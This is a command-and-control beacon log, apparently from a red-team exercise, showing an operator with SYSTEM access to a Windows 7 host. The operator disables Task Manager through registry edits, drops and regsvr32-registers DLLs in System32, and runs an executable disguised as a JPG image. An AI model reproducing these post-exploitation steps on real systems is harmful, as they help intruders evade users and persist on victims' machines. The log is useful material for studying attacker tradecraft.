02/02 16:48:14 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 2272; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/02 16:49:41 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:49:41 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
02/02 16:49:41 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\MicrosoftWindows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:49:41 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
02/02 16:49:41 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:49:41 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
02/02 16:50:11 [checkin] host called home, sent: 2790 bytes
02/02 16:50:13 [output]
received output:


PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies\System
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies
PSChildName    : System
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
DisableTaskMgr : 1





02/02 16:50:13 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:50:13 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\P_x000D__x000A_</S><S S="Error">olicies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\P_x000D__x000A_</S><S S="Error">olicies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:50:13 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:50:13 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem -Name DisableTaskMgr -propertyType Dword -Value 0x00000001_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:52:56 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:52:56 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:52:56 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\MicrosoftWindows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:53:13 [checkin] host called home, sent: 1261 bytes
02/02 16:53:14 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:53:14 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 17:00:39 [task] Tasked beacon to make directory c:\RedTeam\
02/02 17:00:39 [task] cd c:\RedTeam\
02/02 17:00:39 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
02/02 17:00:39 [indicator] file: 81a37e8ec86659fd550df0bbd554ada6 60416 bytes win32UIDEMO.JPG
02/02 17:00:39 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
02/02 17:01:14 [checkin] host called home, sent: 60538 bytes
02/02 17:05:20 [task] Tasked beacon to make directory c:\RedTeam\
02/02 17:05:20 [task] cd c:\RedTeam\
02/02 17:05:20 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
02/02 17:05:21 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
02/02 17:05:21 [task] Tasked beacon to make directory c:\RedTeam\
02/02 17:05:21 [task] cd c:\RedTeam\
02/02 17:05:21 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
02/02 17:05:21 [indicator] file: 81a37e8ec86659fd550df0bbd554ada6 60416 bytes win32UIDEMO.JPG
02/02 17:05:21 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
02/02 17:06:14 [checkin] host called home, sent: 174093 bytes
02/02 17:30:05 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:30:05 [task] cd C:\Windows\System32\
02/02 17:30:05 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
02/02 17:30:05 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
02/02 17:30:05 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:30:05 [task] cd C:\Windows\System32\
02/02 17:30:07 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\ucrtbased.dll as ucrtbased.dll
02/02 17:30:07 [indicator] file: d2e30ccb8427870b1f8b3c2ecb6563bf 1647104 bytes ucrtbased.dll
02/02 17:30:07 [task] Tasked beacon to run: regsvr32 vcruntime140d.dll
02/02 17:30:07 [task] Tasked beacon to run: regsvr32 ucrtbased.dll
02/02 17:30:07 [task] Tasked beacon to make directory c:\RedTeam\
02/02 17:30:07 [task] cd c:\RedTeam\
02/02 17:30:07 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
02/02 17:30:07 [indicator] file: 81a37e8ec86659fd550df0bbd554ada6 60416 bytes win32UIDEMO.JPG
02/02 17:30:07 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
02/02 17:30:15 [checkin] host called home, sent: 900086 bytes
02/02 17:31:16 [checkin] host called home, sent: 921420 bytes
02/02 17:42:48 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:42:48 [task] cd C:\Windows\System32\
02/02 17:42:49 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140.dll as vcruntime140.dll
02/02 17:42:49 [indicator] file: edf9d5c18111d82cf10ec99f6afa6b47 87888 bytes vcruntime140.dll
02/02 17:42:49 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:42:49 [task] cd C:\Windows\System32\
02/02 17:42:50 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\concrt140.dll as concrt140.dll
02/02 17:42:50 [indicator] file: 14b7a99127ca18df05dd1f5be3ac0245 333632 bytes concrt140.dll
02/02 17:42:50 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:42:50 [task] cd C:\Windows\System32\
02/02 17:42:51 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\msvcp140.dll as msvcp140.dll
02/02 17:42:51 [indicator] file: 9ff712c25312821b8aec84c4f8782a34 633152 bytes msvcp140.dll
02/02 17:42:52 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:42:52 [task] cd C:\Windows\System32\
02/02 17:42:53 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vccorlib140.dll as vccorlib140.dll
02/02 17:42:53 [indicator] file: 3d8e0ebbb613cbe80320a61259d18514 395592 bytes vccorlib140.dll
02/02 17:42:53 [task] Tasked beacon to make directory C:\Windows\System32\
02/02 17:42:53 [task] cd C:\Windows\System32\
02/02 17:42:53 [task] Tasked beacon to run: regsvr32 vcruntime140.dll
02/02 17:42:53 [task] Tasked beacon to run: regsvr32 concrt140.dll
02/02 17:42:53 [task] Tasked beacon to run: regsvr32 msvcp140.dll
02/02 17:42:53 [task] Tasked beacon to run: regsvr32 vccorlib140.dll
02/02 17:42:53 [task] Tasked beacon to make directory c:\RedTeam\
02/02 17:42:53 [task] cd c:\RedTeam\
02/02 17:42:53 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
02/02 17:42:53 [indicator] file: 81a37e8ec86659fd550df0bbd554ada6 60416 bytes win32UIDEMO.JPG
02/02 17:42:53 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
02/02 17:43:37 [checkin] host called home, sent: 421741 bytes
02/02 17:44:37 [checkin] host called home, sent: 1029161 bytes
02/02 17:46:17 [checkin] host called home, sent: 60500 bytes
02/02 18:33:42 [task] Tasked beacon to make directory c:\RedTeam\
02/02 18:33:42 [task] cd c:\RedTeam\
02/02 18:33:42 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
02/02 18:33:42 [indicator] file: 071e62bfe2e1a86254eb5d5ba24f5495 31744 bytes win32UIDEMO.JPG
02/02 18:33:42 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
02/02 18:34:22 [checkin] host called home, sent: 31866 bytes
02/02 18:34:22 [output]
received output:
应用程序无法启动，因为应用程序的并行配置不正确。有关详细信息，请参阅应用程序事件日志，或使用命令行 sxstrace.exe 工具。


